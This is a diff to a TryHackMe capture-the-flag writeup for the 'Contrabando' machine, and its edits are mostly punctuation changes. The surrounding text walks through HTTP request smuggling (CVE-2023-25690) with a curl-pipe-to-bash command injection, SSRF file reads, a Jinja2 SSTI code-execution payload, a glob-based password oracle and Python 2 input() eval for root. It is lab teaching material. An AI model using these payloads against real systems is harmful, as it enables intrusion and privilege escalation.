@@ -1,6 +1,6 @@
 ---
 slug: "thm-contrabando"
-title: "Contrabando — TryHackMe Writeup"
+title: "Contrabando - TryHackMe Writeup"
 date: "2026-08-17"
 platform: "TryHackMe"
 type: "Machine"
@@ -98,9 +98,9 @@ The main page is a "COMING SOON" splash with a link to a beta page:
 Key observations from `curl`:
 
 - `GET /` → static HTML “COMING SOON”, link to `/page/home.html`.
-- `GET /page/home.html` → “Our password generator is currently down.” — a static page served by the **backend**.
-- `GET /page/index.php` → **returns the PHP source code, not an executed page** — the proxy serves `/page/*` straight into a backend script that prints the path's target.
-- `GET /page/gen.php` → **also returns source** — a password generator backend script.
+- `GET /page/home.html` → “Our password generator is currently down.” - a static page served by the **backend**.
+- `GET /page/index.php` → **returns the PHP source code, not an executed page** - the proxy serves `/page/*` straight into a backend script that prints the path's target.
+- `GET /page/gen.php` → **also returns source** - a password generator backend script.
 
 Notice the response headers differ between the front door and the `/page/*` route:
 
@@ -113,7 +113,7 @@ Server: Apache/2.4.54 (Debian)
 X-Powered-By: PHP/7.4.33               # backend app server
 ```
 
-**Two different Apache versions responding** — we are talking to a reverse proxy fronting a backend PHP application. This will be the seed of the whole compromise.
+**Two different Apache versions responding** - we are talking to a reverse proxy fronting a backend PHP application. This will be the seed of the whole compromise.
 
 The two PHP files we can read:
 
@@ -163,11 +163,11 @@ Reading `/etc/hosts` tells us we are inside a Docker container:
 172.18.0.3      124a042cc76c        <- container hostname = container ID prefix
 ```
 
-`readfile()` also supports stream wrappers (`http://`, `file://`), giving us full SSRF from the backend — useful for peeling the architecture apart, but the real prize is the request smuggling.
+`readfile()` also supports stream wrappers (`http://`, `file://`), giving us full SSRF from the backend - useful for peeling the architecture apart, but the real prize is the request smuggling.
 
 ---
 
-## 2. Foothold — HTTP Request Smuggling (CVE-2023-25690) → Container Shell
+## 2. Foothold - HTTP Request Smuggling (CVE-2023-25690) → Container Shell
 
 ### 2.1 Understanding the Proxy Chain
 
@@ -238,15 +238,15 @@ www-data@124a042cc76c:/var/www/html$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-We are `www-data` in a **Docker container** (`124a042cc76c`). The `Content-Length` in the smuggled POST must match the exact byte length of `length=1;curl ...|bash;` — count carefully, or the backend will wait for more data and the shell never fires.
+We are `www-data` in a **Docker container** (`124a042cc76c`). The `Content-Length` in the smuggled POST must match the exact byte length of `length=1;curl ...|bash;` - count carefully, or the backend will wait for more data and the shell never fires.
 
 ---
 
-## 3. Lateral Movement — From Container to Host (SSRF + SSTI)
+## 3. Lateral Movement - From Container to Host (SSRF + SSTI)
 
 ### 3.1 Mapping the Internal Network
 
-From inside the container we enumerate the Docker bridge network (`172.18.0.0/24`). The gateway `172.18.0.1` is the host machine — and it exposes an interesting port:
+From inside the container we enumerate the Docker bridge network (`172.18.0.0/24`). The gateway `172.18.0.1` is the host machine - and it exposes an interesting port:
 
 ![Internal network scan](https://i.imgur.com/stOW8v1.png)
 
@@ -262,9 +262,9 @@ HTTP/1.1 200 OK
 Server: Werkzeug/3.0.0 Python/3.8.10   # Flask development server on the HOST
 ```
 
-### 3.2 The Flask App — SSRF + SSTI
+### 3.2 The Flask App - SSRF + SSTI
 
-`http://172.18.0.1:5000/` is a “Website Display” utility: you give it a URL, it fetches the content with `pycurl` and renders it back in HTML. Let's probe it with `file://` URLs — SSRF:
+`http://172.18.0.1:5000/` is a “Website Display” utility: you give it a URL, it fetches the content with `pycurl` and renders it back in HTML. Let's probe it with `file://` URLs - SSRF:
 
 ```bash
 curl -s -X POST http://172.18.0.1:5000/ --data-urlencode 'website_url=file:///home/hansolo/app/app.py'
@@ -296,7 +296,7 @@ def display_website():
     return render_template('index.html')
 ```
 
-`render_template_string()` renders the fetched content as a **Jinja2 template** — anything in the fetched page between `{{ }}` gets evaluated server-side. That is a textbook Server-Side Template Injection.
+`render_template_string()` renders the fetched content as a **Jinja2 template** - anything in the fetched page between `{{ }}` gets evaluated server-side. That is a textbook Server-Side Template Injection.
 
 ### 3.3 Proving SSTI → RCE as hansolo
 
@@ -321,7 +321,7 @@ Now weaponize it into command execution:
 {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
 ```
 
-Result: `uid=1000(hansolo) gid=1000(hansolo)` — we are running code on the **host** as the user `hansolo` (uid 1000).
+Result: `uid=1000(hansolo) gid=1000(hansolo)` - we are running code on the **host** as the user `hansolo` (uid 1000).
 
 ### 3.4 User Flag
 
@@ -345,11 +345,11 @@ THM{FLAG}
 
 ---
 
-## 4. Privilege Escalation — hansolo → root
+## 4. Privilege Escalation - hansolo → root
 
 After compromising the host as `hansolo` via the Flask SSTI, we enumerate the machine for privilege escalation vectors.
 
-### 4.1 Stage 1 — `vault` and the Bash Glob Injection Oracle
+### 4.1 Stage 1 - `vault` and the Bash Glob Injection Oracle
 
 Enumerating binaries on the host reveals a custom script `/usr/bin/vault` which can be executed as root with `sudo` without requiring a password (`NOPASSWD`):
 
@@ -385,7 +385,7 @@ Password matched!
 1. Lightsaber Colors: ...  (star wars trivia from /root/secrets)
 ```
 
-We can read `/root/secrets`, but the actual password is in `/root/password` — we never see its value directly. However, the same glob semantics let us **oracle** the password one character at a time: `guess="<prefix>*"` matches **only if the password actually starts with `<prefix>`**. So we brute-force it char by char, using `Password matched!` as the oracle:
+We can read `/root/secrets`, but the actual password is in `/root/password` - we never see its value directly. However, the same glob semantics let us **oracle** the password one character at a time: `guess="<prefix>*"` matches **only if the password actually starts with `<prefix>`**. So we brute-force it char by char, using `Password matched!` as the oracle:
 
 ```bash
 $ cat bforce.sh
@@ -444,7 +444,7 @@ This confirms the second sudo rule: `(root) /usr/bin/python* /opt/generator/app.
 
 ---
 
-### 4.3 Stage 2 — Python 2 `input()` RCE → Root
+### 4.3 Stage 2 - Python 2 `input()` RCE → Root
 
 We inspect the generator script at `/opt/generator/app.py`:
 
@@ -468,7 +468,7 @@ except NameError:
 ...
 ```
 
-In **Python 2**, `input()` is `eval(raw_input())` — whatever we type is evaluated as Python code. If we run it with `python2` under sudo, we get code execution as root.
+In **Python 2**, `input()` is `eval(raw_input())` - whatever we type is evaluated as Python code. If we run it with `python2` under sudo, we get code execution as root.
 
 We automate the interaction with `pexpect` (SSH → sudo → feed length → inject payload):
 
